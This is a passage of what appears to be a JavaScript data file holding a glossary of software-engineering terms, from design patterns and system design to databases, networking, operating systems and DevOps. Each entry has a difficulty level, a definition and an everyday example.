  { term: "Singleton Pattern", category: "OOP & Design Patterns", level: "Intermediate", definition: "Ensures a class has only ONE instance and provides global access to it. Use sparingly — can be an anti-pattern.", example: "A database connection pool — you only want one pool managing all connections, not multiple pools competing for resources." },
  { term: "Factory Pattern", category: "OOP & Design Patterns", level: "Intermediate", definition: "Creates objects without exposing instantiation logic. A 'factory' method decides which class to instantiate based on input.", example: "NotificationFactory.create('email') returns an EmailNotification. create('sms') returns SMSNotification. The caller doesn't know or care about the concrete classes." },
  { term: "Observer Pattern", category: "OOP & Design Patterns", level: "Intermediate", definition: "When one object (subject) changes state, all its dependents (observers) are notified and updated automatically. Pub/Sub at the object level.", example: "YouTube subscriptions — when a creator uploads a video (subject changes), all subscribers (observers) get notified automatically." },
  { term: "Strategy Pattern", category: "OOP & Design Patterns", level: "Intermediate", definition: "Define a family of algorithms, encapsulate each one, and make them interchangeable. The client picks which strategy to use at runtime.", example: "A routing app lets you choose: driving strategy, walking strategy, cycling strategy. Same interface (getRoute), different algorithms." },
  { term: "Decorator Pattern", category: "OOP & Design Patterns", level: "Intermediate", definition: "Dynamically add responsibilities to an object by wrapping it in a decorator object. Alternative to subclassing for extending behavior.", example: "Coffee ordering: start with BasicCoffee, wrap with MilkDecorator, wrap with SugarDecorator. Each decorator adds behavior without changing the original." },
  { term: "Adapter Pattern", category: "OOP & Design Patterns", level: "Intermediate", definition: "Converts the interface of a class into another interface that clients expect. Makes incompatible interfaces work together.", example: "A power plug adapter lets a US plug work in a European socket. In code: wrapping a legacy XML API to expose a modern JSON interface." },
  { term: "MVC (Model-View-Controller)", category: "OOP & Design Patterns", level: "Intermediate", definition: "Architectural pattern separating concerns: Model (data/logic), View (UI/display), Controller (handles user input, coordinates M and V).", example: "A blog: Model = database of posts, View = HTML templates, Controller = handles 'create post' button click, saves to model, refreshes view." },
  { term: "Repository Pattern", category: "OOP & Design Patterns", level: "Intermediate", definition: "Abstracts data access behind a clean interface. Business logic talks to the repository, not directly to the database.", example: "UserRepository.findById(42) — the business logic doesn't know if it's using PostgreSQL, MongoDB, or a file. Swap databases without changing business code." },
  { term: "Builder Pattern", category: "OOP & Design Patterns", level: "Intermediate", definition: "Constructs complex objects step by step. Separates construction from representation so the same process can create different objects.", example: "QueryBuilder().select('name').from('users').where('age > 18').build() — chain methods to construct a complex SQL query piece by piece." },
  { term: "Proxy Pattern", category: "OOP & Design Patterns", level: "Advanced", definition: "Provides a surrogate or placeholder for another object to control access. Types: virtual (lazy loading), protection (access control), remote (network proxy).", example: "A virtual proxy for large images — shows a placeholder until the real image loads. The proxy has the same interface as the real image." },

  // ═══════════════════════════════════════════
  // SYSTEM DESIGN & ARCHITECTURE
  // ═══════════════════════════════════════════
  { term: "System Design", category: "System Design & Architecture", level: "Intermediate", definition: "The process of defining the architecture, components, modules, interfaces, and data flow of a system to satisfy requirements at scale.", example: "Designing Twitter: user service, tweet service, timeline service, notification service, caching layer, CDN, message queues — all working together." },
  { term: "High-Level Design (HLD)", category: "System Design & Architecture", level: "Intermediate", definition: "Architectural overview showing major components, their interactions, data flow, and technology choices. The 'big picture' blueprint.", example: "HLD of an e-commerce system: boxes for Frontend, API Gateway, Product Service, Order Service, Payment Service, Database, Cache — with arrows showing communication." },
  { term: "Low-Level Design (LLD)", category: "System Design & Architecture", level: "Intermediate", definition: "Detailed design of individual components: class diagrams, method signatures, database schemas, API contracts, algorithms used.", example: "LLD of the Order Service: OrderController → OrderService → OrderRepository. Order class with fields (id, items, total, status). State machine for order lifecycle." },
  { term: "Monolith Architecture", category: "System Design & Architecture", level: "Foundational", definition: "All functionality is built and deployed as a single, unified application. Simple to develop initially but becomes hard to scale and maintain as it grows.", example: "A small startup's app where user management, billing, and product catalog are all in one codebase, one deployment, one database. Fast to ship v1." },
  { term: "Microservices Architecture", category: "System Design & Architecture", level: "Intermediate", definition: "Application is split into small, independent services that communicate over the network. Each service is deployable, scalable, and maintainable independently.", example: "Netflix: separate services for user profiles, recommendations, streaming, billing. The recommendation team can deploy 10x/day without affecting billing." },
  { term: "Service-Oriented Architecture (SOA)", category: "System Design & Architecture", level: "Intermediate", definition: "Precursor to microservices: application components provide services to other components via a network protocol, often through an Enterprise Service Bus (ESB).", example: "An enterprise where HR, Finance, and Inventory are separate services communicating through a central message bus (ESB) using SOAP/XML." },
  { term: "Serverless Architecture", category: "System Design & Architecture", level: "Intermediate", definition: "You write functions, and the cloud provider manages all infrastructure. Scales automatically, you pay only for execution time.", example: "AWS Lambda function that resizes uploaded images. No server management, scales from 0 to 10,000 concurrent executions automatically." },
  { term: "Event-Driven Architecture", category: "System Design & Architecture", level: "Intermediate", definition: "Components communicate by producing and consuming events (immutable facts about something that happened). Loose coupling, asynchronous.", example: "OrderPlaced event → Inventory Service reserves stock, Payment Service charges card, Email Service sends confirmation — all independently, no direct calls." },
  { term: "API Gateway", category: "System Design & Architecture", level: "Intermediate", definition: "A single entry point for all client requests that routes to appropriate backend services. Handles auth, rate limiting, logging, and request aggregation.", example: "Instead of the mobile app calling 5 different services, it calls one API Gateway which fans out requests and combines responses." },
  { term: "Load Balancer", category: "System Design & Architecture", level: "Intermediate", definition: "Distributes incoming traffic across multiple servers to prevent any single server from being overwhelmed. Improves availability and performance.", example: "Like a restaurant host distributing guests across 10 tables evenly. If one table (server) is full, guests go to another. Round-robin, least connections, or IP hash strategies." },
  { term: "Horizontal vs Vertical Scaling", category: "System Design & Architecture", level: "Intermediate", definition: "Vertical: add more power to one machine (bigger CPU/RAM). Horizontal: add more machines. Horizontal is preferred for web-scale systems.", example: "Vertical: upgrading from 8GB to 64GB RAM (has limits). Horizontal: adding 10 more servers behind a load balancer (nearly limitless)." },
  { term: "Caching", category: "System Design & Architecture", level: "Intermediate", definition: "Storing frequently accessed data in fast storage (RAM) to avoid expensive recomputation or database queries.", example: "Instead of querying the database for a user's profile on every page load, cache it in Redis. Cache hit: 1ms. DB query: 50ms." },
  { term: "CDN (Content Delivery Network)", category: "System Design & Architecture", level: "Intermediate", definition: "A globally distributed network of servers that delivers content from the server closest to the user, reducing latency.", example: "A user in India loads images from an Indian CDN edge server instead of the US origin server. Latency drops from 200ms to 20ms." },
  { term: "Message Queue", category: "System Design & Architecture", level: "Intermediate", definition: "A buffer between producers and consumers of messages. Enables asynchronous processing and decouples services.", example: "User uploads a video → message goes to queue → video processing service picks it up when ready. The user doesn't wait for processing to complete." },
  { term: "Pub/Sub (Publish-Subscribe)", category: "System Design & Architecture", level: "Intermediate", definition: "A messaging pattern where publishers send messages to topics, and subscribers receive messages from topics they're interested in. Complete decoupling.", example: "A 'user-signup' topic: the email service, analytics service, and CRM service all subscribe independently. Adding a new subscriber requires zero changes to the publisher." },
  { term: "CAP Theorem", category: "System Design & Architecture", level: "Advanced", definition: "In a distributed system, you can guarantee at most 2 of 3: Consistency (all nodes see the same data), Availability (every request gets a response), Partition tolerance (system works despite network splits).", example: "During a network partition: choose CP (MongoDB — reject writes to maintain consistency) or AP (Cassandra — accept writes, resolve conflicts later)." },
  { term: "ACID Properties", category: "System Design & Architecture", level: "Intermediate", definition: "Database transaction guarantees: Atomicity (all or nothing), Consistency (valid state transitions), Isolation (transactions don't interfere), Durability (committed data survives crashes).", example: "Bank transfer: debit $100 from A and credit $100 to B either BOTH happen or NEITHER happens (Atomicity). Your balance is never wrong (Consistency)." },
  { term: "BASE Properties", category: "System Design & Architecture", level: "Advanced", definition: "Alternative to ACID for distributed systems: Basically Available, Soft state, Eventually consistent. Trades strong consistency for availability and performance.", example: "Instagram likes: if you like a post, your friend might see the old count for a few seconds (eventually consistent), but the system never goes down (available)." },
  { term: "Rate Limiting", category: "System Design & Architecture", level: "Intermediate", definition: "Controlling the number of requests a client can make in a given time period. Prevents abuse and protects system resources.", example: "Twitter API: 300 requests per 15 minutes per user. Exceeding it returns HTTP 429 'Too Many Requests'. Algorithms: token bucket, sliding window." },
  { term: "Circuit Breaker Pattern", category: "System Design & Architecture", level: "Advanced", definition: "Prevents cascading failures by stopping calls to a failing service. States: Closed (normal), Open (failing, reject calls), Half-Open (test if recovered).", example: "If the payment service fails 5 times in 10 seconds, the circuit breaker 'opens' — all payment requests immediately get 'service unavailable' instead of timing out." },
  { term: "Saga Pattern", category: "System Design & Architecture", level: "Advanced", definition: "Managing distributed transactions across multiple services using a sequence of local transactions with compensating actions for rollback.", example: "Order flow: Reserve Inventory → Charge Payment → Ship. If shipping fails, compensating actions: refund payment → unreserve inventory." },
  { term: "CQRS (Command Query Responsibility Segregation)", category: "System Design & Architecture", level: "Advanced", definition: "Separates read operations (queries) from write operations (commands) into different models, potentially different databases.", example: "Writes go to a normalized PostgreSQL database. Reads come from a denormalized Elasticsearch index optimized for search. Sync via events." },
  { term: "Event Sourcing", category: "System Design & Architecture", level: "Advanced", definition: "Instead of storing current state, store a sequence of events that led to the current state. The state is derived by replaying events.", example: "Bank account: instead of 'balance = $500', store: [Deposited $1000, Withdrew $300, Deposited $100, Withdrew $300]. Replay = $500. Full audit trail." },
  { term: "Domain-Driven Design (DDD)", category: "System Design & Architecture", level: "Advanced", definition: "Designing software based on the business domain, using a ubiquitous language shared between developers and domain experts. Bounded contexts separate different domain models.", example: "In e-commerce, 'Product' means different things to Catalog (name, description, images) and Warehouse (weight, dimensions, location). Each is a bounded context." },
  { term: "Twelve-Factor App", category: "System Design & Architecture", level: "Intermediate", definition: "A methodology for building SaaS apps that are portable, scalable, and deployable on modern cloud platforms. 12 principles including config in env vars, stateless processes, etc.", example: "Factor III: Config in environment variables (not hardcoded). Factor VI: Stateless processes. Factor IX: Fast startup and graceful shutdown." },
  { term: "Idempotency", category: "System Design & Architecture", level: "Intermediate", definition: "An operation is idempotent if performing it multiple times produces the same result as performing it once. Critical for reliable distributed systems.", example: "HTTP PUT is idempotent: setting user email to 'a@b.com' ten times has the same effect as once. HTTP POST (create) is NOT — you'd create 10 records." },
  { term: "Back-of-the-Envelope Estimation", category: "System Design & Architecture", level: "Intermediate", definition: "Quick, approximate calculations to estimate system requirements (storage, bandwidth, QPS) using powers of 2 and common benchmarks.", example: "Twitter: 500M users, 20% daily active, avg 2 tweets/day = 200M tweets/day ≈ 2300 tweets/sec. 280 chars × 2 bytes ≈ 560 bytes/tweet. ~112 GB/day of tweet text." },

  // ═══════════════════════════════════════════
  // DATABASES & STORAGE
  // ═══════════════════════════════════════════
  { term: "Database", category: "Databases & Storage", level: "Foundational", definition: "An organized collection of structured data stored electronically. Managed by a Database Management System (DBMS) that handles storage, retrieval, and manipulation.", example: "Your contacts app uses a database — each contact is a row with name, phone, email columns. The DBMS handles searching, sorting, and saving." },
  { term: "RDBMS (Relational Database Management System)", category: "Databases & Storage", level: "Foundational", definition: "A database system that stores data in tables (relations) with rows and columns. Enforces schemas and relationships. Uses SQL.", example: "MySQL, PostgreSQL, Oracle, SQL Server. An 'Orders' table linked to a 'Customers' table via customer_id — that's the 'relational' part." },
  { term: "SQL (Structured Query Language)", category: "Databases & Storage", level: "Foundational", definition: "The standard language for interacting with relational databases. SELECT to query, INSERT to add, UPDATE to modify, DELETE to remove.", example: "SELECT name, email FROM users WHERE age > 18 ORDER BY name; — reads like English: 'get names and emails of adults, sorted alphabetically'." },
  { term: "NoSQL", category: "Databases & Storage", level: "Intermediate", definition: "Non-relational databases designed for specific data models and flexible schemas. Types: document (MongoDB), key-value (Redis), columnar (Cassandra), graph (Neo4j).", example: "A product catalog where each product has different attributes — one has 'size', another has 'wattage'. MongoDB's flexible schema handles this naturally." },
  { term: "Primary Key", category: "Databases & Storage", level: "Foundational", definition: "A column (or combination) that uniquely identifies each row in a table. No duplicates, no nulls allowed.", example: "user_id = 42 uniquely identifies exactly one user. Like a Social Security Number — no two people share one." },
  { term: "Foreign Key", category: "Databases & Storage", level: "Foundational", definition: "A column in one table that references the primary key of another table. Establishes a relationship between tables.", example: "orders.customer_id references customers.id — this links each order to the customer who placed it." },
  { term: "Index (Database)", category: "Databases & Storage", level: "Intermediate", definition: "A data structure (usually B+ tree) that speeds up data retrieval. Like a book's index — find topics quickly without reading every page.", example: "Without an index on 'email', finding a user by email scans all 10M rows. With an index: direct lookup in milliseconds." },
  { term: "Normalization", category: "Databases & Storage", level: "Intermediate", definition: "Organizing database tables to reduce data redundancy and improve integrity. Normal forms: 1NF, 2NF, 3NF, BCNF, etc.", example: "Instead of storing customer address in every order row (redundancy), store it once in a Customers table and reference via foreign key." },
  { term: "Denormalization", category: "Databases & Storage", level: "Intermediate", definition: "Intentionally adding redundancy to a database to improve read performance. Trades storage and write complexity for faster reads.", example: "Storing the customer's name directly in the Orders table so you don't need a JOIN on every order lookup. Common in read-heavy systems." },
  { term: "JOIN", category: "Databases & Storage", level: "Foundational", definition: "Combining rows from two or more tables based on a related column. Types: INNER (matching only), LEFT (all from left + matching), RIGHT, FULL OUTER.", example: "SELECT orders.id, customers.name FROM orders INNER JOIN customers ON orders.customer_id = customers.id — combines order data with customer names." },
  { term: "Transaction", category: "Databases & Storage", level: "Intermediate", definition: "A group of database operations that must all succeed or all fail together (atomic). Maintains data integrity.", example: "Transferring $100: BEGIN → debit(A, 100) → credit(B, 100) → COMMIT. If credit fails, debit is rolled back. Money is never lost or created." },
  { term: "Sharding", category: "Databases & Storage", level: "Advanced", definition: "Splitting a database horizontally across multiple servers, where each server holds a subset of the data based on a shard key.", example: "Users A-M on Server 1, N-Z on Server 2. Each server handles only half the queries. Used when one server can't handle the full dataset." },
  { term: "Replication", category: "Databases & Storage", level: "Advanced", definition: "Copying data across multiple servers for redundancy and read scalability. Types: master-slave (one writes, many read), master-master (all read/write).", example: "Primary database in US handles writes. Replicas in Europe and Asia handle local reads. If primary fails, a replica is promoted." },
  { term: "Partitioning", category: "Databases & Storage", level: "Advanced", definition: "Dividing a table into smaller pieces within the same database. Horizontal (by rows) or vertical (by columns). Improves query performance.", example: "Partition the 'orders' table by year: orders_2023, orders_2024, orders_2025. Queries for 2025 data only scan the 2025 partition." },
  { term: "ORM (Object-Relational Mapping)", category: "Databases & Storage", level: "Intermediate", definition: "A technique that lets you interact with a database using your programming language's objects instead of raw SQL.", example: "Instead of writing SQL: SELECT * FROM users WHERE id=1, you write: User.findById(1). The ORM generates the SQL for you. Examples: Prisma, SQLAlchemy, Hibernate." },
  { term: "Migration (Database)", category: "Databases & Storage", level: "Intermediate", definition: "Version-controlled changes to a database schema. Each migration file defines changes (add table, modify column) and how to undo them.", example: "Migration #5: ADD COLUMN 'phone' TO users. Migration #6: CREATE TABLE orders. Applied in order, can be rolled back in reverse order." },
  { term: "Redis", category: "Databases & Storage", level: "Intermediate", definition: "An in-memory key-value store used as a cache, session store, message broker, and more. Extremely fast (microsecond operations).", example: "Cache the top 100 trending posts in Redis. Instead of computing them from 1B posts each request, serve the pre-computed list from memory." },
  { term: "Stored Procedure", category: "Databases & Storage", level: "Intermediate", definition: "Pre-compiled SQL code stored in the database that can be called by name. Runs on the database server, reducing network round trips.", example: "A stored procedure 'transfer_funds(from, to, amount)' handles the entire transfer logic on the DB side — one call instead of multiple queries." },
  { term: "View (Database)", category: "Databases & Storage", level: "Intermediate", definition: "A virtual table based on a SQL query. Doesn't store data itself — just provides a named, reusable query result.", example: "CREATE VIEW active_users AS SELECT * FROM users WHERE last_login > '2025-01-01'; — now query 'active_users' like a table." },
  { term: "EXPLAIN / Query Plan", category: "Databases & Storage", level: "Advanced", definition: "Shows how the database will execute a query — which indexes it uses, join order, estimated cost. Essential for performance optimization.", example: "EXPLAIN SELECT * FROM orders WHERE user_id = 42; reveals if the query uses the user_id index or does a full table scan (slow)." },
  { term: "Connection Pooling", category: "Databases & Storage", level: "Intermediate", definition: "Maintaining a pool of reusable database connections instead of opening/closing a new one for each request. Reduces overhead.", example: "A pool of 20 connections serves 1000 requests/sec by reusing connections. Without pooling, opening 1000 connections/sec would overwhelm the database." },
  { term: "Write-Ahead Log (WAL)", category: "Databases & Storage", level: "Advanced", definition: "A log where changes are written before they're applied to the database. Ensures durability — if a crash occurs, replay the log to recover.", example: "PostgreSQL's WAL: write 'UPDATE user SET name=X' to the log FIRST, then update the actual data. Crash? Replay the log. No data loss." },
  { term: "Data Warehouse vs Data Lake", category: "Databases & Storage", level: "Advanced", definition: "Warehouse: structured, processed data optimized for analytical queries (BigQuery, Redshift). Data Lake: raw data in any format stored cheaply (S3, HDFS).", example: "Data Lake = throwing all raw logs, CSVs, images into a giant bucket. Data Warehouse = cleaned, organized data ready for 'show me Q3 revenue by region' queries." },
  { term: "Time-Series Database", category: "Databases & Storage", level: "Advanced", definition: "Optimized for time-stamped data: metrics, events, sensor readings. Efficient at storing, compressing, and querying sequential time data.", example: "InfluxDB, TimescaleDB — storing server CPU metrics every second for a year. Standard RDBMS would struggle; TSDB handles billions of points efficiently." },

  // ═══════════════════════════════════════════
  // NETWORKING & WEB
  // ═══════════════════════════════════════════
  { term: "HTTP / HTTPS", category: "Networking & Web", level: "Foundational", definition: "HTTP is the protocol for web communication. HTTPS is HTTP with TLS encryption for security. Methods: GET (read), POST (create), PUT (update), DELETE (remove).", example: "You type a URL → your browser sends an HTTP GET request → the server responds with HTML. HTTPS encrypts the conversation so hackers can't eavesdrop." },
  { term: "REST (Representational State Transfer)", category: "Networking & Web", level: "Intermediate", definition: "An architectural style for APIs using HTTP methods on resources identified by URLs. Stateless, cacheable, uniform interface.", example: "GET /api/users/42 — retrieve user 42. POST /api/users — create a user. PUT /api/users/42 — update user 42. DELETE /api/users/42 — delete user 42." },
  { term: "API (Application Programming Interface)", category: "Networking & Web", level: "Foundational", definition: "A defined interface that allows two software systems to communicate. Specifies what requests you can make and what responses you'll get.", example: "Weather API: send your city name, get back temperature and forecast. Like a restaurant menu — it defines what you can order and what you'll receive." },
  { term: "GraphQL", category: "Networking & Web", level: "Intermediate", definition: "A query language for APIs where the client specifies exactly what data it needs. Solves REST's over-fetching and under-fetching problems.", example: "Instead of GET /users/42 returning 50 fields, you query { user(id: 42) { name, email } } and get only name and email. One request, exact data." },
  { term: "WebSocket", category: "Networking & Web", level: "Intermediate", definition: "A protocol providing full-duplex (two-way) communication over a single TCP connection. Server can push data to client without client asking.", example: "Chat apps, live sports scores, stock tickers — the server pushes updates instantly. With HTTP, you'd have to keep asking 'any new messages?' (polling)." },
  { term: "TCP/IP", category: "Networking & Web", level: "Foundational", definition: "TCP: reliable, ordered, connection-based protocol. IP: addressing and routing packets across networks. Together they're the backbone of the internet.", example: "TCP = sending a certified letter (guaranteed delivery, correct order). IP = the postal address system (routing to the right destination)." },
  { term: "UDP", category: "Networking & Web", level: "Intermediate", definition: "A connectionless protocol that sends data without guaranteeing delivery or order. Faster than TCP because it skips handshakes and acknowledgments.", example: "Video calls and gaming use UDP — a dropped packet (tiny glitch) is better than waiting for retransmission (lag). Speed > reliability for real-time." },
  { term: "DNS (Domain Name System)", category: "Networking & Web", level: "Foundational", definition: "Translates human-readable domain names (google.com) into IP addresses (142.250.80.46) that computers use. The internet's phone book.", example: "You type 'youtube.com' → DNS lookup → 142.250.80.46 → your browser connects to that IP. Without DNS, you'd need to memorize IP addresses." },
  { term: "IP Address (IPv4 / IPv6)", category: "Networking & Web", level: "Foundational", definition: "A unique numerical address for each device on a network. IPv4: 32-bit (192.168.1.1, ~4.3 billion addresses). IPv6: 128-bit (practically unlimited).", example: "IPv4 addresses ran out — that's why we need IPv6. 192.168.1.1 is your home router's address (private). Your ISP assigns a public IP." },
  { term: "Port", category: "Networking & Web", level: "Foundational", definition: "A logical endpoint for network communication. Each port number (0-65535) identifies a specific service running on a machine.", example: "Port 80 = HTTP, 443 = HTTPS, 22 = SSH, 5432 = PostgreSQL. Like apartment numbers in a building — the IP is the building address, ports are units." },
  { term: "TLS/SSL", category: "Networking & Web", level: "Intermediate", definition: "Protocols that encrypt data transmitted over a network. TLS (modern successor to SSL) provides encryption, authentication, and integrity.", example: "The padlock icon in your browser = TLS. Your credit card number is encrypted before being sent. Even if intercepted, it's unreadable." },
  { term: "OAuth 2.0", category: "Networking & Web", level: "Intermediate", definition: "An authorization framework that lets third-party apps access user data without exposing passwords. Uses tokens instead of credentials.", example: "'Sign in with Google' — the app never sees your Google password. Google gives the app a limited-access token. You can revoke access anytime." },
  { term: "JWT (JSON Web Token)", category: "Networking & Web", level: "Intermediate", definition: "A self-contained token format for securely transmitting information between parties as JSON. Digitally signed, can be verified without a database lookup.", example: "After login, server creates a JWT containing { userId: 42, role: 'admin', exp: '2025-12-31' }. Client sends it with every request. Server verifies the signature without hitting the DB." },
  { term: "Cookie", category: "Networking & Web", level: "Foundational", definition: "Small piece of data stored by the browser, sent automatically with every request to the same domain. Used for sessions, preferences, tracking.", example: "When you log into Amazon, a session cookie is stored. On your next visit, Amazon reads the cookie and knows you're logged in — no re-entering password." },
  { term: "CORS (Cross-Origin Resource Sharing)", category: "Networking & Web", level: "Intermediate", definition: "A security mechanism where browsers restrict web pages from making requests to a different domain than the one serving the page, unless the server explicitly allows it.", example: "Your app at app.com tries to fetch data from api.otherdomain.com. Without CORS headers from the API, the browser blocks the request for security." },
  { term: "gRPC", category: "Networking & Web", level: "Advanced", definition: "A high-performance RPC framework using HTTP/2 and Protocol Buffers. Supports streaming, is strongly typed, and is much faster than REST+JSON.", example: "Microservices communicating internally use gRPC for speed — binary serialization (protobuf) is 10x smaller and faster than JSON. Used by Google, Netflix." },
  { term: "Webhook", category: "Networking & Web", level: "Intermediate", definition: "A callback mechanism where one system sends an HTTP POST to another system's URL when an event occurs. Push-based, no polling needed.", example: "Stripe sends a webhook to your server when a payment succeeds. You don't poll Stripe asking 'paid yet?' every second — it tells you." },
  { term: "Proxy vs Reverse Proxy", category: "Networking & Web", level: "Intermediate", definition: "Forward proxy: acts on behalf of the CLIENT (hides client identity). Reverse proxy: acts on behalf of the SERVER (hides server identity, handles load balancing).", example: "Forward: VPN hides your IP when browsing. Reverse: Nginx sits in front of your servers, distributing traffic and handling SSL. Users never see your actual servers." },
  { term: "OSI Model", category: "Networking & Web", level: "Intermediate", definition: "7-layer conceptual model for network communication: Physical, Data Link, Network, Transport, Session, Presentation, Application. Each layer has a specific role.", example: "Layer 7 (Application): HTTP. Layer 4 (Transport): TCP/UDP. Layer 3 (Network): IP. Layer 1 (Physical): Ethernet cable. Data flows down layers when sending, up when receiving." },
  { term: "Latency vs Throughput", category: "Networking & Web", level: "Intermediate", definition: "Latency: time for one request to complete (milliseconds). Throughput: number of requests processed per unit time. Both matter but are different.", example: "Latency = how fast one car goes (120 km/h). Throughput = how many cars pass per hour (1000 cars/hr). A highway can have high throughput even if each car isn't the fastest." },

  // ═══════════════════════════════════════════
  // OPERATING SYSTEMS
  // ═══════════════════════════════════════════
  { term: "Operating System (OS)", category: "Operating Systems", level: "Foundational", definition: "System software that manages hardware resources and provides services for application programs. The intermediary between hardware and user software.", example: "Windows, macOS, Linux, Android. Without an OS, every app would need to directly manage memory, disk, screen, keyboard — impossibly complex." },
  { term: "Process", category: "Operating Systems", level: "Foundational", definition: "An instance of a running program with its own memory space, resources, and execution context. The OS schedules and manages processes.", example: "Opening Chrome creates a process. Opening another Chrome window creates another process. Each has isolated memory — one crashing doesn't kill the other." },
  { term: "Thread", category: "Operating Systems", level: "Intermediate", definition: "A lightweight unit of execution within a process. Threads within the same process share memory but have their own execution stack.", example: "A word processor: one thread handles typing, another checks spelling, another auto-saves. They share the document data but run independently." },
  { term: "Concurrency vs Parallelism", category: "Operating Systems", level: "Intermediate", definition: "Concurrency: managing multiple tasks at once (may be interleaved on one CPU). Parallelism: actually executing multiple tasks simultaneously on multiple CPUs.", example: "Concurrency: a chef switching between chopping and stirring (one person, multiple tasks). Parallelism: two chefs each doing a different task simultaneously." },
  { term: "Deadlock", category: "Operating Systems", level: "Intermediate", definition: "A situation where two or more processes are each waiting for the other to release a resource, so none can proceed. Circular dependency.", example: "Thread A holds Lock 1 and waits for Lock 2. Thread B holds Lock 2 and waits for Lock 1. Neither can continue — frozen forever." },
  { term: "Mutex (Mutual Exclusion)", category: "Operating Systems", level: "Intermediate", definition: "A synchronization mechanism that ensures only one thread can access a shared resource at a time. Like a bathroom lock — one person at a time.", example: "Two threads updating the same bank balance. Without a mutex: both read $100, both add $50, both write $150 (lost update). With mutex: one waits, result is $200." },
  { term: "Semaphore", category: "Operating Systems", level: "Intermediate", definition: "A synchronization tool that controls access to a resource by maintaining a counter. Unlike mutex (binary: 0 or 1), semaphore can allow N concurrent accesses.", example: "A parking lot with 50 spaces. Semaphore count = 50. Each car entering decrements (49, 48...). At 0, new cars wait. Car leaving increments. Limits concurrency." },
  { term: "Context Switch", category: "Operating Systems", level: "Intermediate", definition: "The OS saving the state of the current process/thread and loading the state of the next one. Has overhead — registers, program counter, memory maps all switch.", example: "CPU working on Process A, timer interrupt fires, OS saves A's state, loads Process B's state, CPU now works on B. Happens thousands of times per second." },
  { term: "Virtual Memory", category: "Operating Systems", level: "Intermediate", definition: "An abstraction that gives each process the illusion of having its own large, contiguous memory space. Maps virtual addresses to physical RAM or disk.", example: "Your 8GB RAM laptop runs programs needing 16GB total. Virtual memory pages less-used data to disk. Each program thinks it has ample contiguous memory." },
  { term: "Paging", category: "Operating Systems", level: "Advanced", definition: "Dividing virtual memory into fixed-size blocks (pages) and physical memory into frames. Pages map to frames via a page table. Enables non-contiguous allocation.", example: "A program's memory is divided into 4KB pages. Page 0 might be in RAM frame 47, page 1 in frame 12 — they don't need to be adjacent." },
  { term: "File System", category: "Operating Systems", level: "Foundational", definition: "The method and data structure the OS uses to organize and store files on disk. Manages file naming, permissions, metadata, and physical storage.", example: "ext4 (Linux), NTFS (Windows), APFS (macOS). They handle things like: where file data lives on the disk, directory trees, journaling for crash recovery." },
  { term: "Kernel", category: "Operating Systems", level: "Intermediate", definition: "The core of an operating system. Manages CPU, memory, devices, and system calls. Runs in privileged mode with direct hardware access.", example: "When you call open('file.txt'), your program makes a system call to the kernel, which handles the disk I/O and returns a file descriptor. User code can't touch hardware directly." },
  { term: "System Call", category: "Operating Systems", level: "Intermediate", definition: "The interface between user programs and the OS kernel. Programs request OS services (file I/O, networking, process creation) via system calls.", example: "read(), write(), fork(), exec(), socket() — these aren't library functions but requests to the kernel to perform privileged operations on your behalf." },
  { term: "Shell", category: "Operating Systems", level: "Foundational", definition: "A command-line interface for interacting with the OS. Interprets user commands and executes them. The user-facing wrapper around the kernel.", example: "Bash, Zsh, PowerShell. You type 'ls -la' (list files), the shell interprets it, calls the kernel, and displays results. Scripts automate sequences of commands." },
  { term: "Race Condition", category: "Operating Systems", level: "Intermediate", definition: "A bug where the system's behavior depends on the timing/ordering of events (typically thread execution order). Produces unpredictable, intermittent failures.", example: "Two threads incrementing a counter: both read 5, both write 6. Expected: 7. Got: 6. The 'race' between threads caused a lost update. Maddeningly hard to reproduce." },
  { term: "I/O Bound vs CPU Bound", category: "Operating Systems", level: "Intermediate", definition: "I/O bound: program speed limited by input/output (disk, network). CPU bound: limited by processing power. Different optimizations for each.", example: "Web server waiting for DB responses = I/O bound (use async I/O, more threads). Bitcoin mining = CPU bound (need faster processors, more cores)." },

  // ═══════════════════════════════════════════
  // DEVOPS & INFRASTRUCTURE
  // ═══════════════════════════════════════════
  { term: "DevOps", category: "DevOps & Infrastructure", level: "Intermediate", definition: "A culture and set of practices that unifies software development (Dev) and IT operations (Ops). Aims for shorter release cycles, higher quality, and faster feedback.", example: "Instead of developers throwing code 'over the wall' to an ops team, both collaborate: automated testing, CI/CD, monitoring, infrastructure as code." },
  { term: "CI/CD (Continuous Integration / Continuous Delivery)", category: "DevOps & Infrastructure", level: "Intermediate", definition: "CI: automatically building and testing code whenever changes are pushed. CD: automatically deploying tested code to production (or staging).", example: "Push to GitHub → GitHub Actions runs tests → if green, auto-deploys to staging → after approval, deploys to production. Code reaches users in minutes, not months." },
  { term: "Version Control (Git)", category: "DevOps & Infrastructure", level: "Foundational", definition: "A system that tracks changes to files over time. Git is the dominant VCS — distributed, supports branching, merging, and collaboration.", example: "Commit = a snapshot. Branch = a parallel timeline. Merge = combining branches. You can always go back to any previous state. Like 'undo' on steroids." },
  { term: "Git Branch", category: "DevOps & Infrastructure", level: "Foundational", definition: "An independent line of development. Create a branch to work on a feature without affecting the main codebase. Merge when done.", example: "main branch = production code. feature/user-auth branch = your work-in-progress. When finished and tested, merge feature/user-auth into main." },
  { term: "Pull Request / Merge Request", category: "DevOps & Infrastructure", level: "Foundational", definition: "A request to merge your branch into another (usually main). Enables code review — teammates review your changes before they're merged.", example: "You open a PR: 'Add user authentication'. Teammate reviews, leaves comments, requests changes. After approval, code is merged. Quality gate before production." },
  { term: "Docker / Container", category: "DevOps & Infrastructure", level: "Intermediate", definition: "A container packages an application with all its dependencies into an isolated, portable unit. Docker is the most popular container platform.", example: "'It works on my machine' problem solved. A Docker container runs identically on your laptop, CI server, and production. Same OS, libraries, config everywhere." },
  { term: "Kubernetes (K8s)", category: "DevOps & Infrastructure", level: "Advanced", definition: "An orchestration platform for managing containerized applications at scale. Handles deployment, scaling, load balancing, self-healing, and rolling updates.", example: "You tell K8s: 'Run 5 instances of my web app.' If one crashes, K8s automatically starts a replacement. Traffic spikes? K8s scales to 20 instances." },
  { term: "Infrastructure as Code (IaC)", category: "DevOps & Infrastructure", level: "Intermediate", definition: "Managing and provisioning infrastructure through code (not manual UI clicks). Version-controlled, reproducible, and auditable.", example: "Terraform file: 'Create 3 EC2 instances, a load balancer, and an RDS database.' Run it, infrastructure appears. Destroy it, start fresh. Like a recipe for servers." },
